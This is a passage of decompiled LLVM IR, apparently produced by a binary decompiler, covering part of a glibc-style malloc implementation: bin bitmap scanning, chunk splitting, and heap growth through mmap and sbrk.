  %v4_805362f = phi i32 [ %storemerge1.pre, %dec_label_pc_8053608 ], [ %v3_805361b, %dec_label_pc_8053618 ]
  store i32 %v4_805362f, i32* %eax.global-to-local, align 4
  %v12_8053684 = icmp eq i32 %v4_805362f, %v2_805360c
  %v1_8053686 = icmp eq i1 %v12_8053684, false
  br i1 %v1_8053686, label %dec_label_pc_8053618, label %dec_label_pc_8053688.loopexit

dec_label_pc_8053688.loopexit:                    ; preds = %dec_label_pc_8053684
  br label %dec_label_pc_8053688

dec_label_pc_8053688:                             ; preds = %dec_label_pc_8053688.loopexit, %dec_label_pc_80535fa
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8053691 = add i32 %stack_var_-40.0.ph, 1
  %v2_8053694 = udiv i32 %v1_8053691, 32
  store i32 %v2_8053694, i32* @edi, align 4
  %v1_8053697 = mul i32 %v1_8053691, 8
  %v2_8053697 = add i32 %v1_8053697, ptrtoint (i32* @global_var_80637cc.524 to i32)
  store i32 %v2_8053697, i32* %ebx.global-to-local, align 4
  %v1_805369e = urem i32 %v1_8053691, 32
  %v2_805369e = icmp eq i32 %v1_805369e, 0
  store i32 %v1_805369e, i32* %ecx.global-to-local, align 4
  %v1_80536a1 = mul nuw nsw i32 %v2_8053694, 4
  %v2_80536a1 = add i32 %v1_80536a1, ptrtoint (i32* @global_var_8063ad4.528 to i32)
  %v3_80536a1 = inttoptr i32 %v2_80536a1 to i32*
  %v4_80536a1 = load i32, i32* %v3_80536a1, align 4
  store i32 %v4_80536a1, i32* %edx.global-to-local, align 4
  br i1 %v2_805369e, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_8053688
  %v5_80536a8 = shl i32 1, %v1_805369e
  store i32 %v5_80536a8, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8053688, %bb85, %dec_label_pc_80536e9
  %v1_80536aa = phi i32 [ %v1_80536aa.pre, %dec_label_pc_80536e9 ], [ %v4_80536a1, %bb85 ], [ %v4_80536a1, %dec_label_pc_8053688 ]
  %v0_80536ae = phi i32 [ %v0_80536aa.pre, %dec_label_pc_80536e9 ], [ %v5_80536a8, %bb85 ], [ 1, %dec_label_pc_8053688 ]
  %tmp86 = icmp ule i32 %v0_80536ae, %v1_80536aa
  %v1_80536ae = icmp eq i32 %v0_80536ae, 0
  %v1_80536b0 = icmp eq i1 %v1_80536ae, false
  %or.cond = and i1 %tmp86, %v1_80536b0
  br i1 %or.cond, label %dec_label_pc_80536ae.dec_label_pc_80536de.preheader_crit_edge, label %dec_label_pc_80536b2.preheader

dec_label_pc_80536ae.dec_label_pc_80536de.preheader_crit_edge: ; preds = %.preheader
  %v0_80536d912.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80536de.preheader

dec_label_pc_80536b2.preheader:                   ; preds = %.preheader
  %v0_80536b2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80536b2

dec_label_pc_80536b2:                             ; preds = %dec_label_pc_80536b2.preheader, %dec_label_pc_80536bc
  %v0_80536b2 = phi i32 [ %v0_80536b2.pre, %dec_label_pc_80536b2.preheader ], [ %v1_80536b2, %dec_label_pc_80536bc ]
  %v1_80536b2 = add i32 %v0_80536b2, 1
  store i32 %v1_80536b2, i32* @edi, align 4
  %v6_80536b6 = icmp ugt i32 %v1_80536b2, 2
  br i1 %v6_80536b6, label %dec_label_pc_8053765.loopexit, label %dec_label_pc_80536bc

dec_label_pc_80536bc:                             ; preds = %dec_label_pc_80536b2
  %v1_80536bc = mul i32 %v1_80536b2, 4
  %v2_80536bc = add i32 %v1_80536bc, ptrtoint (i32* @global_var_8063ad4.528 to i32)
  %v3_80536bc = inttoptr i32 %v2_80536bc to i32*
  %v4_80536bc = load i32, i32* %v3_80536bc, align 4
  store i32 %v4_80536bc, i32* %edx.global-to-local, align 4
  %v1_80536c3 = icmp eq i32 %v4_80536bc, 0
  br i1 %v1_80536c3, label %dec_label_pc_80536b2, label %dec_label_pc_80536c7

dec_label_pc_80536c7:                             ; preds = %dec_label_pc_80536bc
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80536ce = mul i32 %v1_80536b2, 256
  store i32 %v2_80536ce, i32* %eax.global-to-local, align 4
  %v1_80536d1 = add i32 %v2_80536ce, ptrtoint (i32* @global_var_80637cc.524 to i32)
  store i32 %v1_80536d1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80536de.preheader

dec_label_pc_80536de.preheader:                   ; preds = %dec_label_pc_80536ae.dec_label_pc_80536de.preheader_crit_edge, %dec_label_pc_80536c7
  %v0_80536d912 = phi i32 [ %v1_80536d1, %dec_label_pc_80536c7 ], [ %v0_80536d912.pre, %dec_label_pc_80536ae.dec_label_pc_80536de.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80536c7 ], [ %v0_80536ae, %dec_label_pc_80536ae.dec_label_pc_80536de.preheader_crit_edge ]
  %v0_80536f0 = phi i32 [ %v4_80536bc, %dec_label_pc_80536c7 ], [ %v1_80536aa, %dec_label_pc_80536ae.dec_label_pc_80536de.preheader_crit_edge ]
  %v2_80536de4 = and i32 %v0_80536f0, %esi.promoted
  %v3_80536de5 = icmp eq i32 %v2_80536de4, 0
  br i1 %v3_80536de5, label %dec_label_pc_80536d9, label %dec_label_pc_80536e2

dec_label_pc_80536d9:                             ; preds = %dec_label_pc_80536de.preheader, %dec_label_pc_80536d9
  %v2_80536dc14 = phi i32 [ %v2_80536dc, %dec_label_pc_80536d9 ], [ %esi.promoted, %dec_label_pc_80536de.preheader ]
  %v0_80536d913 = phi i32 [ %v1_80536d9, %dec_label_pc_80536d9 ], [ %v0_80536d912, %dec_label_pc_80536de.preheader ]
  %v1_80536d9 = add i32 %v0_80536d913, 8
  %v2_80536dc = mul i32 %v2_80536dc14, 2
  %v2_80536de = and i32 %v2_80536dc, %v0_80536f0
  %v3_80536de = icmp eq i32 %v2_80536de, 0
  br i1 %v3_80536de, label %dec_label_pc_80536d9, label %dec_label_pc_80536de.dec_label_pc_80536e2_crit_edge

dec_label_pc_80536de.dec_label_pc_80536e2_crit_edge: ; preds = %dec_label_pc_80536d9
  store i32 %v1_80536d9, i32* %ebx.global-to-local, align 4
  store i32 %v2_80536dc, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80536e2

dec_label_pc_80536e2:                             ; preds = %dec_label_pc_80536de.dec_label_pc_80536e2_crit_edge, %dec_label_pc_80536de.preheader
  %v0_80536f2 = phi i32 [ %v2_80536dc, %dec_label_pc_80536de.dec_label_pc_80536e2_crit_edge ], [ %esi.promoted, %dec_label_pc_80536de.preheader ]
  %v1_805370c = phi i32 [ %v1_80536d9, %dec_label_pc_80536de.dec_label_pc_80536e2_crit_edge ], [ %v0_80536d912, %dec_label_pc_80536de.preheader ]
  %v1_80536e2 = add i32 %v1_805370c, 12
  %v2_80536e2 = inttoptr i32 %v1_80536e2 to i32*
  %v3_80536e2 = load i32, i32* %v2_80536e2, align 4
  store i32 %v3_80536e2, i32* @ecx, align 4
  %v12_80536e5 = icmp eq i32 %v3_80536e2, %v1_805370c
  %v1_80536e7 = icmp eq i1 %v12_80536e5, false
  br i1 %v1_80536e7, label %dec_label_pc_80536fd, label %dec_label_pc_80536e9

dec_label_pc_80536e9:                             ; preds = %dec_label_pc_80536e2
  %v1_80536eb = add i32 %v3_80536e2, 8
  store i32 %v1_80536eb, i32* %ebx.global-to-local, align 4
  %v1_80536ee = sub i32 -1, %v0_80536f2
  store i32 %v1_80536ee, i32* %eax.global-to-local, align 4
  %v2_80536f0 = and i32 %v0_80536f0, %v1_80536ee
  store i32 %v2_80536f0, i32* %edx.global-to-local, align 4
  %v2_80536f2 = mul i32 %v0_80536f2, 2
  store i32 %v2_80536f2, i32* %esi.global-to-local, align 4
  %v1_80536f4 = load i32, i32* @edi, align 4
  %v2_80536f4 = mul i32 %v1_80536f4, 4
  %v3_80536f4 = add i32 %v2_80536f4, ptrtoint (i32* @global_var_8063ad4.528 to i32)
  %v4_80536f4 = inttoptr i32 %v3_80536f4 to i32*
  store i32 %v2_80536f0, i32* %v4_80536f4, align 4
  %v0_80536aa.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80536aa.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_80536fd:                             ; preds = %dec_label_pc_80536e2
  %v1_80536fd = add i32 %v3_80536e2, 4
  %v2_80536fd = inttoptr i32 %v1_80536fd to i32*
  %v3_80536fd = load i32, i32* %v2_80536fd, align 4
  store i32 %v3_80536fd, i32* %edx.global-to-local, align 4
  %v1_8053700 = add i32 %v3_80536e2, 12
  %v2_8053700 = inttoptr i32 %v1_8053700 to i32*
  %v3_8053700 = load i32, i32* %v2_8053700, align 4
  store i32 %v3_8053700, i32* %eax.global-to-local, align 4
  %v1_8053703 = and i32 %v3_80536fd, -4
  store i32 %v1_8053703, i32* @edx, align 4
  %v5_8053708 = sub i32 %v1_8053703, %v1_80537fa
  store i32 %v5_8053708, i32* %esi.global-to-local, align 4
  store i32 %v3_8053700, i32* %v2_80536e2, align 4
  %v0_805370f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805370f = load i32, i32* %eax.global-to-local, align 4
  %v2_805370f = add i32 %v1_805370f, 8
  %v3_805370f = inttoptr i32 %v2_805370f to i32*
  store i32 %v0_805370f, i32* %v3_805370f, align 4
  %v0_8053712 = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_8053712, 16
  br i1 %tmp128, label %dec_label_pc_8053717, label %dec_label_pc_805371e

dec_label_pc_8053717:                             ; preds = %dec_label_pc_80536fd
  %v0_8053717 = load i32, i32* @ecx, align 4
  %v1_8053717 = load i32, i32* @edx, align 4
  %v2_8053717 = add i32 %v0_8053717, 4
  %v3_8053717 = add i32 %v2_8053717, %v1_8053717
  %v4_8053717 = inttoptr i32 %v3_8053717 to i32*
  %v5_8053717 = load i32, i32* %v4_8053717, align 4
  %v6_8053717 = or i32 %v5_8053717, 1
  store i32 %v6_8053717, i32* %v4_8053717, align 4
  br label %dec_label_pc_805375d

dec_label_pc_805371e:                             ; preds = %dec_label_pc_80536fd
  store i32 %v1_80537fa, i32* %eax.global-to-local, align 4
  %v0_8053727 = load i32, i32* @ecx, align 4
  %v2_8053727 = add i32 %v0_8053727, %v1_80537fa
  store i32 %v2_8053727, i32* @edx, align 4
  %v1_805372a = load i32, i32* @ebp, align 4
  %v2_805372a = add i32 %v1_805372a, 8
  %v3_805372a = inttoptr i32 %v2_805372a to i32*
  store i32 %v2_8053727, i32* %v3_805372a, align 4
  %v0_805372d = load i32, i32* @edx, align 4
  %v1_805372d = load i32, i32* @ebp, align 4
  %v2_805372d = add i32 %v1_805372d, 12
  %v3_805372d = inttoptr i32 %v2_805372d to i32*
  store i32 %v0_805372d, i32* %v3_805372d, align 4
  %v0_8053730 = load i32, i32* @edx, align 4
  %v1_8053730 = add i32 %v0_8053730, 8
  %v2_8053730 = inttoptr i32 %v1_8053730 to i32*
  store i32 ptrtoint (i32* @global_var_80637d4.526 to i32), i32* %v2_8053730, align 4
  %v0_8053737 = load i32, i32* @edx, align 4
  %v1_8053737 = add i32 %v0_8053737, 12
  %v2_8053737 = inttoptr i32 %v1_8053737 to i32*
  store i32 ptrtoint (i32* @global_var_80637d4.526 to i32), i32* %v2_8053737, align 4
  br i1 %v6_80534b3, label %dec_label_pc_8053746, label %dec_label_pc_8053740

dec_label_pc_8053740:                             ; preds = %dec_label_pc_805371e
  %v0_8053740 = load i32, i32* @edx, align 4
  store i32 %v0_8053740, i32* @global_var_80637d0.525, align 16
  br label %dec_label_pc_8053746

dec_label_pc_8053746:                             ; preds = %dec_label_pc_805371e, %dec_label_pc_8053740
  %v4_8053746 = or i32 %v1_80537fa, 1
  %v0_805374b = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8053746, i32* %ebx.global-to-local, align 4
  %v1_8053751 = or i32 %v0_805374b, 1
  store i32 %v1_8053751, i32* %eax.global-to-local, align 4
  %v1_8053754 = load i32, i32* @ecx, align 4
  %v2_8053754 = add i32 %v1_8053754, 4
  %v3_8053754 = inttoptr i32 %v2_8053754 to i32*
  store i32 %v4_8053746, i32* %v3_8053754, align 4
  %v0_8053757 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053757 = load i32, i32* @edx, align 4
  %v3_8053757 = add i32 %v1_8053757, %v0_8053757
  %v4_8053757 = inttoptr i32 %v3_8053757 to i32*
  store i32 %v0_8053757, i32* %v4_8053757, align 4
  %v0_805375a = load i32, i32* %eax.global-to-local, align 4
  %v1_805375a = load i32, i32* @edx, align 4
  %v2_805375a = add i32 %v1_805375a, 4
  %v3_805375a = inttoptr i32 %v2_805375a to i32*
  store i32 %v0_805375a, i32* %v3_805375a, align 4
  br label %dec_label_pc_805375d

dec_label_pc_805375d:                             ; preds = %dec_label_pc_8053717, %dec_label_pc_8053746
  %v0_805375d = load i32, i32* @ecx, align 4
  %v1_805375d = add i32 %v0_805375d, 8
  store i32 %v1_805375d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b5f

dec_label_pc_8053765.loopexit:                    ; preds = %dec_label_pc_80536b2
  br label %dec_label_pc_8053765

dec_label_pc_8053765:                             ; preds = %dec_label_pc_8053765.loopexit, %dec_label_pc_805346d, %dec_label_pc_8053475
  %v0_8053765 = load i32, i32* @global_var_80637cc.524, align 4
  store i32 %v0_8053765, i32* @ebx, align 4
  %v1_805376f = add i32 %v1_80537fa, 16
  store i32 %v1_805376f, i32* @esi, align 4
  %v1_8053772 = add i32 %v0_8053765, 4
  %v2_8053772 = inttoptr i32 %v1_8053772 to i32*
  %v3_8053772 = load i32, i32* %v2_8053772, align 4
  %v1_8053779 = and i32 %v3_8053772, -4
  store i32 %v1_8053779, i32* %ecx.global-to-local, align 4
  %v7_805377c = icmp ult i32 %v1_8053779, %v1_805376f
  br i1 %v7_805377c, label %dec_label_pc_805379c, label %dec_label_pc_8053780

dec_label_pc_8053780:                             ; preds = %dec_label_pc_8053765
  %v2_8053784 = add i32 %v0_8053765, %v1_80537fa
  store i32 %v2_8053784, i32* @edx, align 4
  %v1_8053787 = or i32 %v1_80537fa, 1
  store i32 %v1_8053787, i32* %eax.global-to-local, align 4
  store i32 %v2_8053784, i32* @global_var_80637cc.524, align 4
  store i32 %v1_8053787, i32* %v2_8053772, align 4
  %v0_8053793 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8053793 = sub i32 %v0_8053793, %v1_80537fa
  store i32 %v5_8053793, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053aef

dec_label_pc_805379c:                             ; preds = %dec_label_pc_8053765
  %v0_805379c = load i32, i32* @global_var_8063afc.529, align 4
  store i32 %v0_805379c, i32* %edx.global-to-local, align 4
  %v0_80537a2 = load i8, i8* @global_var_80637a0.523, align 32
  %v1_80537a2 = and i8 %v0_80537a2, 2
  %v2_80537a2 = icmp eq i8 %v1_80537a2, 0
  br i1 %v2_80537a2, label %dec_label_pc_80537d0, label %dec_label_pc_80537ab

dec_label_pc_80537ab:                             ; preds = %dec_label_pc_805379c
  store i32 ptrtoint (i8* @global_var_80637a0.523 to i32), i32* %stack_var_-92, align 4
  %v2_80537b3 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80637a0.523 to i32*))
  store i32 ptrtoint (i8* @global_var_80637a0.523 to i32), i32* @ebx, align 4
  %v1_80537bd = add i32 %v1_80537fa, -7
  store i32 %v1_80537bd, i32* %eax.global-to-local, align 4
  store i32 %v1_80537bd, i32* %stack_var_-92, align 4
  %v1_80537c1 = call i32 @malloc(i32 %v1_80537bd)
  store i32 %v1_80537c1, i32* %eax.global-to-local, align 4
  store i32 %v1_80537c1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b5f

dec_label_pc_80537d0:                             ; preds = %dec_label_pc_805379c
  %v1_80537d0 = add i32 %v0_805379c, -1
  store i32 %v1_80537d0, i32* @ecx, align 4
  store i32 %v1_80537fa, i32* @ebx, align 4
  %v1_80537db = load i32, i32* @global_var_8063aec.530, align 4
  %v7_80537db = icmp ult i32 %v1_80537fa, %v1_80537db
  br i1 %v7_80537db, label %dec_label_pc_805389d, label %dec_label_pc_80537e7

dec_label_pc_80537e7:                             ; preds = %dec_label_pc_80537d0
  %v0_80537e7 = load i32, i32* @global_var_8063af0.531, align 16
  store i32 %v0_80537e7, i32* %eax.global-to-local, align 4
  %v1_80537ec = load i32, i32* @global_var_8063af4.532, align 4
  %v5_80537f2 = icmp slt i32 %v0_80537e7, %v1_80537ec
  br i1 %v5_80537f2, label %dec_label_pc_80537f8, label %dec_label_pc_805389d

dec_label_pc_80537f8:                             ; preds = %dec_label_pc_80537e7
  %v2_80537fa = add i32 %v1_80537fa, 10
  %v3_80537fa = add i32 %v2_80537fa, %v0_805379c
  %v1_80537fe = sub i32 0, %v0_805379c
  store i32 %v1_80537fe, i32* %eax.global-to-local, align 4
  %v2_8053800 = and i32 %v3_80537fa, %v1_80537fe
  store i32 %v2_8053800, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_8053800, %v1_80537fa
  br i1 %tmp129, label %dec_label_pc_805380c, label %dec_label_pc_805389d

dec_label_pc_805380c:                             ; preds = %dec_label_pc_80537f8
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053819 = call i32 @mmap(i32 0, i32 %v2_8053800, i32 3, i32 34, i32 0, i32 0, i32 %v1_80537d0, i32 %v1_80537d0)
  store i32 %v8_8053819, i32* %eax.global-to-local, align 4
  store i32 %v8_8053819, i32* @edx, align 4
  %v10_8053823 = icmp eq i32 %v8_8053819, -1
  br i1 %v10_8053823, label %dec_label_pc_805380c.dec_label_pc_805389d_crit_edge, label %dec_label_pc_8053828

dec_label_pc_805380c.dec_label_pc_805389d_crit_edge: ; preds = %dec_label_pc_805380c
  %v0_805389d.pre = load i32, i32* @global_var_80637cc.524, align 4
  br label %dec_label_pc_805389d

dec_label_pc_8053828:                             ; preds = %dec_label_pc_805380c
  %v1_805382a = urem i32 %v8_8053819, 8
  %v2_805382a = icmp eq i32 %v1_805382a, 0
  store i32 %v1_805382a, i32* @ecx, align 4
  br i1 %v2_805382a, label %dec_label_pc_8053842, label %dec_label_pc_805382f

dec_label_pc_805382f:                             ; preds = %dec_label_pc_8053828
  %v0_8053834 = load i32, i32* @ebx, align 4
  %v2_8053836 = sub nsw i32 8, %v1_805382a
  store i32 %v2_8053836, i32* %eax.global-to-local, align 4
  %v2_8053838 = add i32 %v2_8053836, %v8_8053819
  store i32 %v2_8053838, i32* @edx, align 4
  %v2_805383a = sub i32 %v0_8053834, %v2_8053836
  store i32 %v2_805383a, i32* %esi.global-to-local, align 4
  %v2_805383c = inttoptr i32 %v2_8053838 to i32*
  store i32 %v2_8053836, i32* %v2_805383c, align 4
  br label %dec_label_pc_805384a

dec_label_pc_8053842:                             ; preds = %dec_label_pc_8053828
  %v1_8053842 = inttoptr i32 %v8_8053819 to i32*
  store i32 0, i32* %v1_8053842, align 4
  br label %dec_label_pc_805384a

dec_label_pc_805384a:                             ; preds = %dec_label_pc_805382f, %dec_label_pc_8053842
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805382f ], [ @ebx, %dec_label_pc_8053842 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805384a = or i32 %storemerge, 2
  %v1_805384d = load i32, i32* @edx, align 4
  %v2_805384d = add i32 %v1_805384d, 4
  %v3_805384d = inttoptr i32 %v2_805384d to i32*
  store i32 %v1_805384a, i32* %v3_805384d, align 4
  %v0_8053850 = load i32, i32* @global_var_8063af0.531, align 16
  %v1_8053855 = add i32 %v0_8053850, 1
  store i32 %v1_8053855, i32* %eax.global-to-local, align 4
  store i32 %v1_8053855, i32* @global_var_8063af0.531, align 16
  %v1_805385b = load i32, i32* @global_var_8063af8.533, align 8
  %v7_8053861 = icmp sgt i32 %v1_8053855, %v1_805385b
  br i1 %v7_8053861, label %dec_label_pc_8053863, label %dec_label_pc_8053868

dec_label_pc_8053863:                             ; preds = %dec_label_pc_805384a
  store i32 %v1_8053855, i32* @global_var_8063af8.533, align 8
  br label %dec_label_pc_8053868

dec_label_pc_8053868:                             ; preds = %dec_label_pc_805384a, %dec_label_pc_8053863
  %v0_8053868 = load i32, i32* @global_var_8063b04.534, align 4
  %v1_805386d = load i32, i32* @ebx, align 4
  %v2_805386d = add i32 %v1_805386d, %v0_8053868
  store i32 %v2_805386d, i32* %eax.global-to-local, align 4
  store i32 %v2_805386d, i32* @global_var_8063b04.534, align 4
  %v1_8053874 = load i32, i32* @global_var_8063b10.535, align 16
  %tmp130 = icmp ugt i32 %v2_805386d, %v1_8053874
  br i1 %tmp130, label %dec_label_pc_805387c, label %dec_label_pc_8053881

dec_label_pc_805387c:                             ; preds = %dec_label_pc_8053868
  store i32 %v2_805386d, i32* @global_var_8063b10.535, align 16
  br label %dec_label_pc_8053881

dec_label_pc_8053881:                             ; preds = %dec_label_pc_8053868, %dec_label_pc_805387c
  %v1_8053881 = load i32, i32* @global_var_8063b08.536, align 8
  %v2_8053881 = add i32 %v1_8053881, %v2_805386d
  store i32 %v2_8053881, i32* %eax.global-to-local, align 4
  %v1_8053887 = load i32, i32* @global_var_8063b14.537, align 4
  %tmp131 = icmp ugt i32 %v2_8053881, %v1_8053887
  br i1 %tmp131, label %dec_label_pc_8053893, label %dec_label_pc_80534e4

dec_label_pc_8053893:                             ; preds = %dec_label_pc_8053881
  store i32 %v2_8053881, i32* @global_var_8063b14.537, align 4
  br label %dec_label_pc_80534e4

dec_label_pc_805389d:                             ; preds = %dec_label_pc_80537f8, %dec_label_pc_805380c.dec_label_pc_805389d_crit_edge, %dec_label_pc_80537e7, %dec_label_pc_80537d0
  %v0_805389d = phi i32 [ %v0_805389d.pre, %dec_label_pc_805380c.dec_label_pc_805389d_crit_edge ], [ %v0_8053765, %dec_label_pc_80537e7 ], [ %v0_8053765, %dec_label_pc_80537f8 ], [ %v0_8053765, %dec_label_pc_80537d0 ]
  store i32 %v0_805389d, i32* %eax.global-to-local, align 4
  %v1_80538a6 = add i32 %v0_805389d, 4
  %v2_80538a6 = inttoptr i32 %v1_80538a6 to i32*
  %v3_80538a6 = load i32, i32* %v2_80538a6, align 4
  %v1_80538b0 = and i32 %v3_80538a6, -4
  %v2_80538b0 = icmp eq i32 %v1_80538b0, 0
  store i32 %v1_80538b0, i32* @ebp, align 4
  %v1_80538b3 = load i32, i32* @global_var_8063ae8.538, align 8
  %v2_80538b3 = add i32 %v1_80538b3, %v1_805376f
  store i32 %v2_80538b3, i32* %eax.global-to-local, align 4
  %v0_80538b9 = load i8, i8* @global_var_8063b00.539, align 256
  %v1_80538b9 = urem i8 %v0_80538b9, 2
  %v2_80538b9 = icmp eq i8 %v1_80538b9, 0
  br i1 %v2_80538b9, label %dec_label_pc_80538c4, label %dec_label_pc_80538c2

dec_label_pc_80538c2:                             ; preds = %dec_label_pc_805389d
  %v2_80538c2 = sub i32 %v2_80538b3, %v1_80538b0
  store i32 %v2_80538c2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80538c4

dec_label_pc_80538c4:                             ; preds = %dec_label_pc_805389d, %dec_label_pc_80538c2
  %v0_80538c8 = phi i32 [ %v2_80538b3, %dec_label_pc_805389d ], [ %v2_80538c2, %dec_label_pc_80538c2 ]
  %v5_80538c8 = add i32 %v0_80538c8, %v1_80537d0
  store i32 %v5_80538c8, i32* %eax.global-to-local, align 4
  %v1_80538cc = sub i32 0, %v0_805379c
  store i32 %v1_80538cc, i32* @edx, align 4
  %v2_80538d4 = and i32 %v5_80538c8, %v1_80538cc
  store i32 %v2_80538d4, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_80538d4, 1
  br i1 %tmp88, label %dec_label_pc_80538ee, label %dec_label_pc_80538d8

dec_label_pc_80538d8:                             ; preds = %dec_label_pc_80538c4
  store i32 %v2_80538d4, i32* %stack_var_-92, align 4
  %v1_80538dc = call i32 @__GI_sbrk(i32 %v2_80538d4)
  store i32 %v1_80538dc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_80538dc, i32* @ebx, align 4
  %v10_80538e9 = icmp eq i32 %v1_80538dc, -1
  %v1_80538ec = icmp eq i1 %v10_80538e9, false
  br i1 %v1_80538ec, label %dec_label_pc_8053944.dec_label_pc_805394d_crit_edge, label %dec_label_pc_80538d8.dec_label_pc_80538ee_crit_edge

dec_label_pc_80538d8.dec_label_pc_80538ee_crit_edge: ; preds = %dec_label_pc_80538d8
  %v0_80538ee.pre = load i8, i8* @global_var_8063b00.539, align 256
  br label %dec_label_pc_80538ee

dec_label_pc_80538ee:                             ; preds = %dec_label_pc_80538d8.dec_label_pc_80538ee_crit_edge, %dec_label_pc_80538c4
  %v0_805391a = phi i32 [ -1, %dec_label_pc_80538d8.dec_label_pc_80538ee_crit_edge ], [ %v1_80538cc, %dec_label_pc_80538c4 ]
  %v0_80538ee = phi i8 [ %v0_80538ee.pre, %dec_label_pc_80538d8.dec_label_pc_80538ee_crit_edge ], [ %v0_80538b9, %dec_label_pc_80538c4 ]
  %v1_80538ee = urem i8 %v0_80538ee, 2
  %v2_80538ee = icmp eq i8 %v1_80538ee, 0
  br i1 %v2_80538ee, label %dec_label_pc_80538ee.dec_label_pc_8053903_crit_edge, label %dec_label_pc_80538f7

dec_label_pc_80538ee.dec_label_pc_8053903_crit_edge: ; preds = %dec_label_pc_80538ee
  %v0_8053903.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053903

dec_label_pc_80538f7:                             ; preds = %dec_label_pc_80538ee
  %v2_80538fb = add i32 %v1_80538b0, %v1_80537d0
  store i32 %v2_80538fb, i32* %eax.global-to-local, align 4
  %v0_80538fd = load i32, i32* @esi, align 4
  %v2_80538fd = add i32 %v0_80538fd, %v2_80538fb
  %v5_80538ff = and i32 %v2_80538fd, %v1_80538cc
  store i32 %v5_80538ff, i32* @esi, align 4
  br label %dec_label_pc_8053903

dec_label_pc_8053903:                             ; preds = %dec_label_pc_80538ee.dec_label_pc_8053903_crit_edge, %dec_label_pc_80538f7
  %v0_8053903 = phi i32 [ %v0_8053903.pre, %dec_label_pc_80538ee.dec_label_pc_8053903_crit_edge ], [ %v5_80538ff, %dec_label_pc_80538f7 ]
  %tmp132 = icmp ult i32 %v0_8053903, 1048576
  br i1 %tmp132, label %dec_label_pc_805390b, label %dec_label_pc_8053910

dec_label_pc_805390b:                             ; preds = %dec_label_pc_8053903
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8053910

dec_label_pc_8053910:                             ; preds = %dec_label_pc_8053903, %dec_label_pc_805390b
  %v0_8053924 = phi i32 [ %v0_8053903, %dec_label_pc_8053903 ], [ 1048576, %dec_label_pc_805390b ]
  %tmp133 = icmp ugt i32 %v0_8053924, %v1_80537fa
  br i1 %tmp133, label %dec_label_pc_805391a, label %dec_label_pc_8053b52

dec_label_pc_805391a:                             ; preds = %dec_label_pc_8053910
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053927 = call i32 @mmap(i32 0, i32 %v0_8053924, i32 3, i32 34, i32 0, i32 0, i32 %v0_805391a, i32 %v0_805391a)
  store i32 %v8_8053927, i32* %eax.global-to-local, align 4
  store i32 %v8_8053927, i32* @ebx, align 4
  %v10_8053931 = icmp eq i32 %v8_8053927, -1
  br i1 %v10_8053931, label %dec_label_pc_8053b52, label %dec_label_pc_8053944.thread

dec_label_pc_8053944.thread:                      ; preds = %dec_label_pc_805391a
  %v0_805393a = load i8, i8* @global_var_8063b00.539, align 1
  %v2_805393a = and i8 %v0_805393a, -2
  store i8 %v2_805393a, i8* @global_var_8063b00.539, align 256
  %v1_8053941 = load i32, i32* @esi, align 4
  %v2_8053941 = add i32 %v1_8053941, %v8_8053927
  store i32 %v2_8053941, i32* @edx, align 4
  br label %dec_label_pc_805394d

dec_label_pc_8053944.dec_label_pc_805394d_crit_edge: ; preds = %dec_label_pc_80538d8
  %v1_8053951.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805394d

dec_label_pc_805394d:                             ; preds = %dec_label_pc_8053944.dec_label_pc_805394d_crit_edge, %dec_label_pc_8053944.thread
  %v1_8053951 = phi i32 [ %v1_8053941, %dec_label_pc_8053944.thread ], [ %v1_8053951.pre, %dec_label_pc_8053944.dec_label_pc_805394d_crit_edge ]
  %v0_8053a1992 = phi i32 [ %v8_8053927, %dec_label_pc_8053944.thread ], [ %v1_80538dc, %dec_label_pc_8053944.dec_label_pc_805394d_crit_edge ]
  %v0_8053a0b91 = phi i32 [ %v2_8053941, %dec_label_pc_8053944.thread ], [ -1, %dec_label_pc_8053944.dec_label_pc_805394d_crit_edge ]
  %v0_8053951 = load i32, i32* @global_var_8063b08.536, align 8
  %v2_8053951 = add i32 %v1_8053951, %v0_8053951
  store i32 %v2_8053951, i32* @global_var_8063b08.536, align 8
  %v2_8053957 = add i32 %v1_80538b0, %v0_805389d
  store i32 %v2_8053957, i32* %ecx.global-to-local, align 4
  %v2_8053959 = sub i32 %v0_8053a1992, %v2_8053957
  %v7_8053959 = icmp ult i32 %v0_8053a1992, %v2_8053957
  %v12_8053959 = icmp eq i32 %v2_8053959, 0
  %v1_805395b = icmp eq i1 %v12_8053959, false
  br i1 %v1_805395b, label %dec_label_pc_8053974, label %dec_label_pc_805395d

dec_label_pc_805395d:                             ; preds = %dec_label_pc_805394d
  %v10_805395d = icmp eq i32 %v0_8053a0b91, -1
  %v1_8053960 = icmp eq i1 %v10_805395d, false
  br i1 %v1_8053960, label %dec_label_pc_8053974, label %dec_label_pc_8053962

dec_label_pc_8053962:                             ; preds = %dec_label_pc_805395d
